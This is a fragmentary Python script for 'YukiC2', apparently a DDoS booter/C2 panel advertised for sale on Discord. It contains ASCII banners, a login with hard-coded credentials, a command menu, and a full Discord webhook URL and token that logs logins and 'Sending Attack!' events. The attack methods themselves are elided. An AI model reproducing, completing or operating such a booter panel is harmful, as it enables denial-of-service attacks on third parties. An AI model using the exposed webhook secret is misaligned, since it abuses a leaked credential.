...
content = "Someone Just Login In YukiC2"

webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1078439902334685305/CXk0ZdCXHpnukk762ByqinO5BhA30WY_l_4kKh7afb-T19aZ7DaYgvnDMJFumtUsgHH9", username="YukiC2", content=content)

embed = DiscordEmbed(title=" :satellite: YukiC2 Login Log :satellite:", color=0x2ecc71)

embed.set_timestamp()
embed.set_footer(text="©️ YukiC2")
embed.add_embed_field(name='Welcome To YukiC2', value='User __pushy__ is Now Logged in!')

webhook.add_embed(embed)
response = webhook.execute()

prot = (random.randint(2,4))
sys.stdout.write("\x1b]2; Yuki C2 |  Online User : [{}] | Username: [-] | Devices : 89 | Expire : [UNLIMITED] \x07".format (prot))
...
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░    
                     ...
                     ░░██████                     
                      ░░░░░░  
            \033[93m>> \033[96mWelcome YukiC2 Made By YukiiBro & Vlyn \033[93m<<
            \033[97m
   ███
  █   █
\033[97m  █   █                     \033[93mWanna Buy? DM yukii#0009 Or You Can DM
\033[97m█████████               ██  \033[93mPushyGamertag27#7165 make Sure You Join
\033[97m█████████              █  █ \033[93mTo Our Server : Coming soon \033[97m
\033[97m███   ███ ██████████████  █      
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m          
""")
username = str(input("\033[33m[YukiC2] \033[93mUsername:\033[37m"))
password = str(input("\033[33m[YukiC2] \033[93mPassword:\033[37m"))
if password == "booter" and username == "yuki":
...
ticket = """\033[96m For Ticket You Can Join Our Discord Server. \033[93mComing soon"""

banner =  """\033[97m|\033[95mYukiC2\033[97m| \033[91m| VIP ACSESS\033[97m: [\033[92mTRUE\033[97m] |  \033[91mDISCORD\033[97m: [\033[92mItzSeven#3217\033[97m] \033[97m| \033[91mNew Design, Enjoy!~
...
\033[95m                    ▐█ ▪▐▌▐█•█▌▐█▄▄▌▐█▄▪▐█
\033[95m                     ▀  ▀ .▀  ▀ ▀▀▀  ▀▀▀▀ 
\033[95m              \033[91m♥ \033[95mYUKI C2 MADE BY YukiiBro \033[91m♥
\033[95m        ══╦═════════════════════════════════╦══
\033[95m╔═════════╩═════════════════════════════════╩═════════╗
\033[95m║              \033[97mWelcome To YukiC2                      \033[95m║
\033[95m║ \033[97mType "help" \033[97mFor Help . If you wanna buy YukiC2      \033[95m║
...
\033[95m   ║ \033[97mCopyrigtht © YukiC2 2023 All Rights Reserved \033[95m║
\033[95m   ╚══════════════════════════════════════════════╝
"""
...
\033[95m         methods              : \033[97mShow All Methods in YukiC2
\033[95m         plant                : \033[97mShow Your Plant
\033[95m         rules                : \033[97mShow Rules
\033[95m    
\033[95m                   \033[93mϟ  \033[97mMade By : YukiiBro \033[93mϟ 
\033[95m                             
\033[95m      ╠═════════╦══════════════$══════════════════╦═════════╣
\033[95m             ╦══╩═════════════════════════════════╩══╦
\033[97m            Copyrigtht © YukiC2 2023 All Rights Reserved
\033[95m             ╩═══════════════════════════════════════╩"""
...
def main():
    ...
    while True:
        ...
        sys.stdout.write("\x1b]2;Yuki C2 | Online User : [{}] | Username: [root] | Devices : 89 | Expire : [UNLIMITED] \x07".format (powerran))
        sin = input("\033[95m[\033[97mroot@Yuki\033[95m]\033[97m~$ \033[37m".format(nicknm)).lower()
        sinput = sin.split(" ")[0]
...
\033[95m╩═══════════════════╩═════════════════╩
                    ...
                    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1078439902334685305/CXk0ZdCXHpnukk762ByqinO5BhA30WY_l_4kKh7afb-T19aZ7DaYgvnDMJFumtUsgHH9", username="YukiC2")

                    embed = DiscordEmbed(title=" :zap: Sending Attack! :zap:", value=f'Sending Attack By User __yuki__', color=0xe74c3c)
